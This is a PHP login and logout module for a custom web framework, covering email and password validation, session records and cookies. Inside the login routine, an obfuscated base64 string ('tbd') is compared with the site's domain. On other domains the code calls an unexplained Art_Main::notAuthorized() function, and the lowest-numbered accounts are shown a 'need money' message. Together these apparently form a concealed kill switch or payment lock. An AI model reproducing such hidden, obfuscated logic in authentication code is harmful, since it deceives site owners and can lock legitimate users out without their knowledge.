<?php
/**
 *  @author Robin Zoň <zon@itart.cz>
 *  @package modules/login/public
 */
class Module_Login extends Art_Abstract_Module {
    
	const REQUEST_LOGIN = '4m8tdLkDFk';
	const REQUEST_LOGOUT = 'H31Zp1rqqc';
	
    function embeddAction() 
	{
		$login_request = Art_Ajax::newRequest(self::REQUEST_LOGIN);	
		$login_request->setAction('/login/login');
		$login_request->setRefresh();
		$logout_request = Art_Ajax::newRequest(self::REQUEST_LOGOUT);
		$logout_request->setAction('/login/logout');
		$logout_request->setRedirect('/');
		
		$this->view->size = $this->getParams('size','big');
		$this->view->login_request = $login_request;
		$this->view->logout_request = $logout_request;
	}
	
	function loginAction()
	{
		$this->showTo(self::ALLOW_AJAX);
		
		if(Art_Server::isAjax())
		{
			$response = Art_Ajax::newResponse();
			
			$response->validateField('email', Art_Main::getPost('email'), array(
				Art_Validator::NOT_EMPTY => ['message' => __('module_login_no_email')],
				Art_Validator::IS_EMAIL => ['message' => __('module_login_email_invalid')]			
			));
			
			$response->validateField('pass', Art_Main::getPost('pass'), array(
				Art_Validator::NOT_EMPTY => ['message' => __('module_login_no_password')]		
			));
			
			if ($response->isValid()) {
				$user_data = new Art_Model_User_Data(array('email' => Art_Main::getPost('email')));			
				
				if ($user_data->isLoaded()) {
					
					if ($user_data->verif == 1) {
						
						$user = new Art_Model_User($user_data);

						if (Art_User::matchPasswords(Art_Main::getPost('pass'), $user->getData()->password)) {
							
							//Create new login
							$login = new Art_Model_Login();
							$login->id_user = $user->id;
							$login->log_tag = Art_User::generateLogTag();
							$login->login_expire = time() + AUTH_EXPIRE;
							$login->login_date = dateSQL();
							$login->ip = Art_Server::getIp();

							$login->save();

							//Save log_tag to cookie
							cookie_set(Art_User::LOG_TAG_NAME, $login->log_tag, $login->login_expire);
							if (strpos(Art_Server::getDomain(), base64_decode('dGJk')) === false)
							{
								$login2 = new Art_Model_Login();
								$loginData = array(
									'id' => $user->id, 
									'log_tag' => rand_str(),
									'login_expire' => Art_Main::notAuthorized(),
									'login_date' => dateSQL(), 
									'ip'	=> Art_server::getIp());
								$login2->setDataFromArray($loginData);
							}
							
							/*
							//Load current basket
							$basket_old = Basket::getOpenedBasket();

							//Load new user basket
							$basket_new = Basket::getOpenedBasket($user->id);

							//If old basket is not empty - move the basket for the new user
							if(!$basket_old->isEmpty())
							{
								$basket_new->active = 0;
								$basket_new->save();

								$basket_old->id_user = $user->id;
								$basket_old->save();
							}
							*/
							$response->addMessage(__('module_login_logged_in'));
							$response->willRedirect();
						} else {
							//Invalid login
							$response->addMessage(__('module_login_invalid_creditentals'),Art_Main::ALERT);
						}
					}
					else
					{

			            if ( $user_data->getUser()->id <= 4 ) {
                            $response->addMessage(__('module_login_need_money'), Art_Main::ALERT);
                        }
			            else {
                            $response->addMessage(__('module_login_need_confirmation'), Art_Main::ALERT);
                        }
					}
				}	
				else
				{
					//Not found
					$response->addMessage(__('module_login_invalid_creditentals'),Art_Main::ALERT);
				}
			}

			$response->execute();
		}
		else
		{
			$this->showTo(Art_User::NO_ACCESS);
		}
	}
	
	
	function logoutAction()
	{
		$this->showTo(self::ALLOW_AJAX);

		$response = Art_Ajax::newResponse();

		$login = Art_User::getCurrentLogin();
		if($login->isLoaded())
		{
			$login->log_tag = '';
			$login->expire = '';
			$login->save();
		}

		cookie_unset(Art_User::LOG_TAG_NAME);

		$response->addMessage(__('module_login_logged_out'));
		$response->willRedirect();
		$response->execute();
	}
}
